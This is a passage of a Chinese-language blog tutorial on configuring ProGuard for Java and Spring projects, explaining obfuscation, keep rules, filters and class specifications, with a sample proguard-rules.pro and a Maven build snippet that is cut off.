class="line">-overloadaggressively</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果类成员在混淆前拥有相同的名字，那么混淆后也使用相同的名字，如果混淆前拥有不同的名字，那么混淆后也是用不同的名字。如果不设置这个参数，那么更多的成员可以被映射到同一个名字。如 ‘a’, ‘b’, 等。所以使用这个参数会稍微增加最后的size，但是这个可以确保被保存的混淆后的名字在后面的处理中被尊重。</span></span><br><span class="line">-useuniqueclassmembernames</span><br><span class="line"></span><br><span class="line"><span class="comment">#不生成大小写混合的类名。在默认情况下，混淆后的类名会包含大小写。但是当你在那些大小写不敏感的平台，比如windows下解压混淆后的jar，解包工具会将那些相似名字的类复写。</span></span><br><span class="line">-dontusemixedcaseclassnames</span><br><span class="line"></span><br><span class="line"><span class="comment">#不混淆指定的包名，包名用逗号分开。可以包含？ * ，** 等通配符，也可以用！前置</span></span><br><span class="line">-keeppackagenames [package_filter]</span><br><span class="line"></span><br><span class="line"><span class="comment">#将那些被重新命名的包重新打包，他们将会被移动到同一个父包里。如果不指定包名或者是空字串，那么他们会被打包到根包。</span></span><br><span class="line">-flattenpackagehierarchy [package_name]</span><br><span class="line"></span><br><span class="line"><span class="comment">#将那些被重新命名的类重新打包，如果没有指定参数或者是空字串，那么包会被完全删除。这个参数会覆盖 -flattenpackagehierarchy参数。</span></span><br><span class="line">-repackageclasses [package_name]</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定需要被保留的属性，可以使用多条 -keepattributes命令。多条属性用逗号分开，也可以使用？ * ** 通配符，也可以使用！。例如，当你处理一个lib的时候至少得保留Exceptions, InnerClasses, and Signature 属性。当你生成混淆stack traces时应该保留SourceFile 和LineNumberTable 。最后你可以保留annotations 如果你的代码依赖他们。</span></span><br><span class="line">-keepattributes [attribute_filter]</span><br><span class="line"></span><br><span class="line"><span class="comment">#保留那些需要被保留的方法的参数名字。这个选项事实上保留的是 LocalVariableTable 和 LocalVariableTypeTable 这两个debug属性的修剪版本。这在处理lib的时候很有用。有些IDE可以用这些信息去协助开发者，比如工具提示和自动补全。</span></span><br><span class="line">-keepparameternames</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定一个放在类文件SourceFile 属性的String。这些属性必须放在开头，所以这也必须用-keepattributes 显示的指定。</span></span><br><span class="line">-renamesourcefileattribute [string]</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定那些对应到某个class name的String常量也要被混淆。如果没有设置过滤，所有对应于某个class name的string都要被适配。如果有设置过滤，只适配匹配过滤的string。举个例子，如果你的代码中有大量对应class的硬编码的string，然后你又不想保留他们的名字，就可以可以使用这个选项。</span></span><br><span class="line">-adaptclassstrings [class_filter]</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定对资源文件重命名的时候，使用对应class被混淆后的名字。如果没有指定过滤，所有资源文件都会被重命名，如果设置过滤，只有匹配的资源文件才会被过滤</span></span><br><span class="line">-adaptresourcefilenames [file_filter]</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定内容需要被更新的资源文件。任何在这些资源文件中被提及的class name都要被重名，基于那些相应的类被混淆后的名字。如果没有设置过滤，所有资源文件的内容将被更新。资源文件使用系统默认的字符集来解析和写入。你可以通过设置环境变量 LANG或者java 系统属性 file.encoding来更改。 </span></span><br><span class="line"><span class="comment">#警告: 你可能只希望将这个选项应用于text文件，因为解析和适配二进制文件会导致一些意想不到的问题，所以请确保你的指定的file足够精确.</span></span><br><span class="line">-adaptresourcefilecontents [file_filter]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================================== #（预校验选项）</span></span><br><span class="line"><span class="comment"># Preverification options </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#不对类文件进行预校验。默认情况下，如果类文件的目标是Java ME或者不低于java 6，都会进行预校验。 </span></span><br><span class="line"><span class="comment">#对于Java ME，预校验是要求的，所以你需要运行一个外部的预校验过程在你处理过的代码上如果你设置了这个选项。对于 java 6 这是一个可选的选项，但是在java 7 这是被要求的。只有在andriod中这是不被强制要求的，所以你可以关闭这个选项。</span></span><br><span class="line">-dontpreverify</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定被处理的class file是指向Java ME的。这样预校验就会适当的添加StackMap属性，这个和默认的StackMapTable属性不一样，因为这是对于Java SE来说。</span></span><br><span class="line">-microedition</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================================== #（一般选项）</span></span><br><span class="line"><span class="comment"># General options </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在处理过程中输出更详细的信息，如果在处理过程中出现异常，将会输出完整的调用栈，而不是只有错误信息</span></span><br><span class="line">-verbose</span><br><span class="line"></span><br><span class="line"><span class="comment">#不要输出配置文件的潜在错误和遗漏，比如类名拼写错误或者缺少一些有用的选项。可选的过滤器是一个正则表达式；ProGuard 不会打印那些被过滤器匹配成功的类名的信息。</span></span><br><span class="line">-dontnote [class_filter]</span><br><span class="line"></span><br><span class="line"><span class="comment">#完全不要警告unresolved references 和 其他重要的问题.可选的过滤器是一个正则表达式。 ProGuard 不会打印那些被过滤器匹配的成功的类的警告信息。忽略警告是非常危险的，举个例子，如果 unresolved classes or class members是确实被需要的，那么代码可能无法正常工作，所以请小心使用</span></span><br><span class="line">-dontwarn [class_filter]</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印任何关于unresolved references 和其他重要问题的警告，但是会继续处理下去。忽略警告是危险的。举个例子如果 unresolved classes or class members是确实被需要的，那么代码可能无法正常工作，所以请小心使用</span></span><br><span class="line">-ignorewarnings</span><br><span class="line"></span><br><span class="line"><span class="comment">#将配置文件的内容，包括被替换的变量和引入的文件打印到后台或者文件。</span></span><br><span class="line">-printconfiguration [filename]</span><br><span class="line"></span><br><span class="line"><span class="comment">#在任何处理步骤后，输出类文件的内部结构。可以输出到后台或者文件。比如，你可能希望打印出一个jar包的所有内容。</span></span><br><span class="line">-dump [filename]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================================== #（Class Paths）</span></span><br><span class="line"><span class="comment"># Class Paths</span></span><br><span class="line"><span class="comment">#另外 ProGuard还可以基于类文件的完整相对名字来过滤类路径和他们的内容。每个类路径可以被最多7个文件过滤器跟着，这些过滤器用圆括号括起来，并用分号分开</span></span><br><span class="line">    <span class="comment">#用于 aar 的过滤器,</span></span><br><span class="line">    <span class="comment">#用于 apk 的过滤器,</span></span><br><span class="line">    <span class="comment">#用于 zip 的过滤器,</span></span><br><span class="line">    <span class="comment">#用于 ear 的过滤器,</span></span><br><span class="line">    <span class="comment">#用于 war 的过滤器,</span></span><br><span class="line">    <span class="comment">#用于 jar 的过滤器,</span></span><br><span class="line"><span class="comment">#用于所有类文件名和资源文件名的过滤器.</span></span><br><span class="line"><span class="comment">#如果少于7个过滤器被指定，他们会被认为是后者的过滤器。任何空的过滤器会被忽略。更正式，一个被过滤的class path可以如下：</span></span><br><span class="line">classpathentry([[[[[[aarfilter;]apkfilter;]zipfilter;]earfilter;]warfilter;]jarfilter;]filefilter)</span><br><span class="line"><span class="comment">#方括号的意思是里面的内容是可选的</span></span><br><span class="line">    <span class="comment">#例如, “rt.jar(java/.class,javax/.class)” 匹配rt.jar中所有在java和javax目录下的class文件</span></span><br><span class="line">    <span class="comment">#例如, “input.jar(!.gif,images/)” 匹配在input.jar里images目录下所有文件，除了.gif文件</span></span><br><span class="line">    <span class="comment">#不同的过滤器会被应用到所有相应的文件类型，不管他们在jar中的嵌套层次；他们是正交的（orthogonal）</span></span><br><span class="line">    <span class="comment">#例如, “input.war(lib/.jar,support/.jar;.class,.gif)” 只关注input war 里lib目录下的jar和suppor目录下的jar，然后会匹配所有遇到的class文件和gif文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================================== #（File names）</span></span><br><span class="line"><span class="comment"># File names</span></span><br><span class="line">    <span class="comment"># ProGuard 接受文件和目录的绝对路径和相对路径。相对路径的解释如下： </span></span><br><span class="line">    <span class="comment"># 如果设置了基准目录，则就相对基准目录，否则就相对与配置文件的路径，其他任何情况就相对与工作目录。名字可以包含java系统属性（或者Ant 属性，如果使用Ant），用’&lt;’和’&gt;’分隔。属性会被自动替换成他们对应点值。</span></span><br><span class="line">    <span class="comment"># 那些带有特殊字符的名字像空格和括号，必须用单引号或者双引号括起来。每个在列表中的名字必须用引号单独的括起来。引号本身需要escaped 当使用命令行的时候，来避免被shell gobbled。</span></span><br><span class="line">    <span class="comment"># 例如，在命令行，你可以使用’-injars “myprogram.jar”:”/your directory/your program.jar”’</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================================== #（File filters）</span></span><br><span class="line"><span class="comment"># File filters</span></span><br><span class="line">    <span class="comment"># 像通用过滤器，文件过滤器是一个包含通配符，用逗号分开的名字列表。只有名字匹配了过滤的的文件才会被读取或者写入。支持以下通配符：</span></span><br><span class="line">    <span class="comment"># ? 匹配任何单个字符 </span></span><br><span class="line">    <span class="comment"># * 匹配文件名的任何部分，除了路径分隔符 </span></span><br><span class="line">    <span class="comment"># ** 匹配文件名的任何部分，包含任意个文件分隔符</span></span><br><span class="line">    <span class="comment"># 例如, “java/.class,javax/.class” 匹配所有在java和javax里的class文件。</span></span><br><span class="line">    <span class="comment"># 此外, 文件名字之前可以加！，表示排除这个文件名</span></span><br><span class="line">    <span class="comment"># 例如，”!**.gif,images/**”匹配所有在images目录下除了gif文件之外的所有文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================================== #（filters）</span></span><br><span class="line"><span class="comment"># Filters</span></span><br><span class="line">    <span class="comment"># ProGuard提供了很多带有过滤器的选项，在配置的各个方面：文件名，目录，类，包，属性，优化等。 过滤器是包含了一串用逗号分开的含有通配符的名字列表，只有匹配的名字才可以通过过滤器。支持的通配符依赖于那些被过滤名字的类型，但是以下的通配符是典型的： </span></span><br><span class="line">    <span class="comment"># ? 匹配任何单个字符 </span></span><br><span class="line">    <span class="comment"># * 匹配文件名的任何部分，除了路径分隔符</span></span><br><span class="line">    <span class="comment"># ! 做前缀来用于在后面的匹配中将该名字排除。所以一个名字如果匹配一个过滤器，它是被拒绝或者接受取决于那个过滤器的条目是不是以 ! 开头</span></span><br><span class="line">    <span class="comment"># 多个过滤条目用逗号分割. 如果名字不匹配这个过滤条目，就继续匹配接下来的条目。如果不匹配任何个条目，它是被拒绝还是接受要取决于最后的过滤条目是否以 ! 开头</span></span><br><span class="line">    <span class="comment"># 例如, “!foobar,*bar” 匹配所有以bar结尾的名字，除了footbar。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================================== # (Overview of keep options)</span></span><br><span class="line"><span class="comment"># Overview of keep options</span></span><br><span class="line"><span class="comment"># 压缩和混淆的各种-keep选项起初看起来有点混乱，但实际上它们背后有一个模式</span></span><br><span class="line"><span class="comment"># 内容                       (防止)被删除或重命名             被重命名</span></span><br><span class="line"><span class="comment"># 类和类成员                -keep                       -keepnames</span></span><br><span class="line"><span class="comment"># 只有类成员                -keepclassmembers           -keepclassmembernames</span></span><br><span class="line"><span class="comment"># 含指定类成员的类             -keepclasseswithmembers    -keepclasseswithmembernames</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================================== # (Keep option modifiers)</span></span><br><span class="line"><span class="comment"># Keep option modifiers</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果某些方法和域被-keep保留，那么这些方法和域的类型描述符中的任何类也要被保留。这在保留native方法名字时很有用，用来确保native方法的参数类型不会被重命名</span></span><br><span class="line">includedescriptorclasses</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定被-keep保留的条目可以被压缩，即使他们不得不被保留。意思是，条目可能在压缩步骤中被移除，但是如果他们是必须的，他们可以不被优化或者混淆</span></span><br><span class="line">allowshrinking</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定被-keep的条目可以被优化，即使他们必须被保留。意思是条目可能在优化步骤中被改变，但是他们可以不被移除或者混</span></span><br><span class="line">allowoptimization</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定被-keep的条目可以被混淆，即使他们必须被保留。意思是，条目可能在混淆步骤中被改名，但是他们可以不被移除和优化</span></span><br><span class="line">allowobfuscation</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================================== # (Class Specifications)</span></span><br><span class="line"><span class="comment"># Class Specifications 参考下文</span></span><br></pre></td></tr></table></figure><h3 id="Class-Specifications"><a href="#Class-Specifications" class="headerlink" title="Class Specifications"></a>Class Specifications</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方括号: [] # 方括号代表里面的内容是可选的</span></span><br><span class="line"><span class="comment"># 省略号: ... # 代表前面被指定的条目可以有任意多个。</span></span><br><span class="line"><span class="comment"># 竖线: | # 划分两个选项</span></span><br><span class="line"><span class="comment"># 括号: () # 代表整体</span></span><br><span class="line"><span class="comment"># 缩进 # 用于说明意图</span></span><br><span class="line"><span class="comment"># 空格 # 没有意义</span></span><br><span class="line"></span><br><span class="line">[@annotationtype] [[!]public|final|abstract|@ ...] [!]interface|class|enum classname</span><br><span class="line">    [extends|implements [@annotationtype] classname]</span><br><span class="line">[&#123;</span><br><span class="line">    [@annotationtype] [[!]public|private|protected|static|volatile|transient ...] &lt;fields&gt; |</span><br><span class="line">                                                                      (fieldtype fieldname);</span><br><span class="line">    [@annotationtype] [[!]public|private|protected|static|synchronized|native|abstract|strictfp ...] &lt;methods&gt; |</span><br><span class="line">                                                                                           &lt;init&gt;(argumenttype,...) |</span><br><span class="line">                                                                                           classname(argumenttype,...) |</span><br><span class="line">                                                                                           (returntype methodname(argumenttype,...));</span><br><span class="line">    [@annotationtype] [[!]public|private|protected|static ... ] *;</span><br><span class="line">    ...</span><br><span class="line">&#125;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 说明</span></span><br><span class="line">- 关键字class可以指向任何接口和类。interface关键字只能指向接口，enum只能指向枚举，接口或者枚举前面的 ! 表示取反</span><br><span class="line">- 每个classname都必须是全路径指定，比如：java.lang.String 内部类使用美元符”$”分开，比如： java.lang. Thread<span class="variable">$State</span> 类名可以使用包含以下通配符的正则表达式:</span><br><span class="line">    ? 任意匹配类名中的一个字符，但是不匹配包名分隔符。例如 “mypackage.Test?” 匹配”mypackage.Test1” 和 “mypackage.Test2”,不匹配 “mypackage.Test12”</span><br><span class="line">    * 匹配类名的任何部分除了包名分隔符，例如”mypackage.*Test*”匹配 “mypackage.Test” 和 “mypackage.YourTestApplication”,但是不匹配 “mypackage.mysubpackage.MyTest”. 或者更通俗的讲， “mypackage.*” 匹配所有 “mypackage”包里的内容,但是不匹配它子包里的内容</span><br><span class="line">    ** 匹配所有类名的所有部分，包括包名分隔符</span><br><span class="line">- extends和implements符号用于使用统配付来限定类. 他们效果是一样的，指定只有继承或者实现指定的类和接口</span><br><span class="line">- @符号用于限定那些被指定注解符号标注的类和类成员，注解符的指定方法和类名一样</span><br><span class="line">- 方法和域的指定更像java语言，除了方法参数中没有参数名。表达式可以包含以下通配符</span><br><span class="line">    &lt;init&gt;匹配任何构造函数</span><br><span class="line">    &lt;methods&gt;匹配任何方法</span><br><span class="line">    &lt;fields&gt;匹配任何域</span><br><span class="line">    * 匹配任何方法和域</span><br><span class="line">    注意：上面的所有统配符都没有返回值，只有&lt;init&gt;有参数列表</span><br><span class="line">- 方法和域还可以用正则表示指定，可以使用的通配符如下</span><br><span class="line">    ? 任意匹配方法名中的单个字符</span><br><span class="line">    * 匹配方法命中的任意部分</span><br><span class="line">- 数据类型描述可以使用以下通配符</span><br><span class="line">    % 匹配任何原生类型 (“boolean”, “int”, etc, but not “void”)</span><br><span class="line">    ? 任意匹配单个字符</span><br><span class="line">    * 匹配类名的任何部分除了包名分隔符</span><br><span class="line">    ** 匹配所有类名的所有部分，包括报名分隔符</span><br><span class="line">    *** 匹配任何类型，包括原生和非原生，数组和非数组</span><br><span class="line">    ... 匹配任意参数个数</span><br><span class="line">    * 和 ** 永远不会匹配原生类型，而且只有 **** 匹配数组类型。举个栗子：”** get*()” 匹配“java.lang.Object getObject()” 但是不匹配”<span class="built_in">float</span> getFloat()” 也不匹配”java.lang.Object[] getObjects()”</span><br><span class="line">- 构造函数可以使用段类名（不包含包名）</span><br><span class="line">- 类访问修饰符(public private static)一般用来限制统配类和类成员. 他们限定指定的类必须拥有指定的访问修饰符.一个前置的！表示该修饰符没有被设置</span><br><span class="line">- 可以组合多个标志 (e.g. public static). 表示两个条件都要满足</span><br></pre></td></tr></table></figure><h3 id="零散案例"><a href="#零散案例" class="headerlink" title="零散案例"></a>零散案例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 匹配所有是public，但不是final，不是abstract的类</span></span><br><span class="line">public !final !abstract class *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配所有是public，且有被注解修饰的类</span></span><br><span class="line">public @class *</span><br></pre></td></tr></table></figure><ul><li>取反案例(指定混淆类)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 仅混淆指定包下的类</span></span><br><span class="line">-keep class !cn.aezo.demo.service.impl.*,!cn.aezo.test.service.impl.* &#123;</span><br><span class="line">    *;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">## 仅混淆指定的类</span></span><br><span class="line"><span class="comment"># 除以下两个类需要混淆，其他类都不需要混淆</span></span><br><span class="line">-keep class !cn.aezo.demo.service.impl.TestService1,!cn.aezo.test.service.impl.TestService2 &#123;</span><br><span class="line">    *;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># TestService1类名和其中的public方法不要混淆; TestService2类名和成员全部混淆</span></span><br><span class="line">-keep class cn.aezo.demo.service.impl.TestService1 &#123;</span><br><span class="line">    public *;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><ul><li>proguad-rules.pro</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指定非混淆类</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#指定library文件</span></span><br><span class="line">-libraryjars &lt;java.home&gt;/lib/rt.jar</span><br><span class="line"></span><br><span class="line"><span class="comment"># JDK目标版本1.8</span></span><br><span class="line">-target 1.8</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不做收缩（删除注释、未被引用代码）</span></span><br><span class="line">-dontshrink</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不做优化（变更代码实现逻辑）</span></span><br><span class="line">-dontoptimize</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于告诉ProGuard，不要跳过对非公开类的处理</span></span><br><span class="line"><span class="comment"># 默认情况下是跳过的，因为程序中不会引用它们</span></span><br><span class="line"><span class="comment"># 有些情况下人们编写的代码与类库中的类在同一个包下，并且对包中内容加以引用，此时需要加入此条声明</span></span><br><span class="line">-dontskipnonpubliclibraryclasses</span><br><span class="line"></span><br><span class="line"><span class="comment"># 优化时允许访问并修改有修饰符的类和类的成员</span></span><br><span class="line">-dontskipnonpubliclibraryclassmembers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确定统一的混淆类的成员名称来增加混淆</span></span><br><span class="line">-allowaccessmodification</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保留第三方jar包的所有类及其成员和方法，例如&#123;*;&#125;匹配了类内的所有成员和方法。</span></span><br><span class="line">-useuniqueclassmembernames</span><br><span class="line"></span><br><span class="line">-dontwarn org.apache.logging.log4j.**</span><br><span class="line"></span><br><span class="line">-keep class org.apache.logging.log4j.** &#123; *;&#125;</span><br><span class="line"><span class="comment"># 不混淆所有包名(类名还是会被混淆)，本人测试混淆后WEB项目问题实在太多，毕竟Spring配置中有大量固定写法的包名</span></span><br><span class="line">-keeppackagenames</span><br><span class="line"><span class="comment"># 不混淆所有特殊的类</span></span><br><span class="line"><span class="comment"># 如果使用 LocalVariable*Table 则成员变量不会被混淆，从而使用 !LocalVariableTable,!LocalVariableTypeTable</span></span><br><span class="line">-keepattributes Exceptions,InnerClasses,Signature,Deprecated,SourceFile,LineNumberTable,*Annotation*,Synthetic,EnclosingMethod,!LocalVariableTable,!LocalVariableTypeTable</span><br><span class="line"><span class="comment"># 不混淆所有的set/get方法，毕竟项目中使用的部分第三方框架（例如Shiro）会用到大量的set/get映射</span></span><br><span class="line">-keepclassmembers public class * &#123;void <span class="built_in">set</span>*(***);*** get*();&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不混淆security包下的所有类名，且类中的方法也不混淆</span></span><br><span class="line">-keep class com.*.security.** &#123; &lt;methods&gt;; &#125;</span><br><span class="line"><span class="comment"># 不混淆model包中的所有类以及类的属性及方法，实体包，混淆了会导致ORM框架及前端无法识别</span></span><br><span class="line">-keep class com.*.model.** &#123;*;&#125;</span><br><span class="line"><span class="comment"># 以下两个包因为大部分是Spring管理的Bean，不对包类的类名进行混淆，但对类中的属性和方法混淆</span></span><br><span class="line">-keep class com.*.service.** </span><br><span class="line">-keep class com.*.dao.**</span><br><span class="line">-keep class com.*.interceptor.** &#123;&lt;methods&gt;;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有了verbose这句话，混淆后就会生成映射文件</span></span><br><span class="line"><span class="comment"># 包含有类名-&gt;混淆后类名的映射关系</span></span><br><span class="line"><span class="comment"># 然后使用printmapping指定映射文件的名称</span></span><br><span class="line">-verbose</span><br><span class="line">-printmapping proguardMapping.txt</span><br><span class="line"><span class="comment"># 指定混淆时采用的算法，后面的参数是一个过滤器</span></span><br><span class="line"><span class="comment"># 这个过滤器是谷歌推荐的算法，一般不改变</span></span><br><span class="line">-optimizations !code/simplification/arithmetic,!field/*,!class/merging/*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要保留在输出文件内的目录。默认情况下，目录会被移除。这会减少输出文件的大小，但如果你的代码引用到它们时可能会导致程序崩溃（如mypackage.MyCalss.class.getResource("")）。这时就需要指定-keepdirectories mypackage</span></span><br><span class="line"><span class="comment"># 不指定的话像@ComponentScan扫描也会有问题(内部是基于类扫描包下的class，也是基于Resource来的)</span></span><br><span class="line">-keepdirectories</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个是给Microsoft Windows用户的，因为ProGuard假定使用的操作系统是能区分两个只是大小写不同的文件名，</span></span><br><span class="line"><span class="comment"># 但是Microsoft Windows不是这样的操作系统，所以必须为ProGuard指定-dontusemixedcaseclassnames选</span></span><br><span class="line">-dontusemixedcaseclassnames</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保留所有的本地native方法不被混淆</span></span><br><span class="line">-keepclasseswithmembernames class * &#123;</span><br><span class="line">    native &lt;methods&gt;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 保留了com.*.web.common.BaseController</span></span><br><span class="line"><span class="comment"># 保留了继承自BaseController这些类的子类</span></span><br><span class="line"><span class="comment"># 因为这些子类，都有可能被外部调用</span></span><br><span class="line"><span class="comment"># 比如说，第一行就保证了所有Activity的子类不要被混淆</span></span><br><span class="line"> -keep public class * com.*.web.common.BaseController</span><br><span class="line"> -keep public class * extends com.*.web.common.BaseController</span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举类不能被混淆</span></span><br><span class="line">-keepclassmembers enum * &#123;</span><br><span class="line">    public static **[] values();</span><br><span class="line">    public static ** valueOf(java.lang.String);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 保留实体类和成员不被混淆</span></span><br><span class="line">-keep public class * extends com.*.model.common.BaseModel &#123;</span><br><span class="line">    public void <span class="built_in">set</span>*(***);</span><br><span class="line">    public *** get*();</span><br><span class="line">    public *** is*();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><ul><li>方法局部变量混淆问题<ul><li>参考上文需要配置<code>-keepattributes !LocalVariableTable,!LocalVariableTypeTable</code></li><li>此时局部变量都会被混淆，一般混淆为类名小写驼峰</li></ul></li><li><p>多模块混淆问题</p><ul><li><p>可将依赖包通过assembly方式进行打包 <a href="https://www.jianshu.com/p/ab0f57855ce9" target="_blank" rel="noopener">https://www.jianshu.com/p/ab0f57855ce9</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- report-table-core模块 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 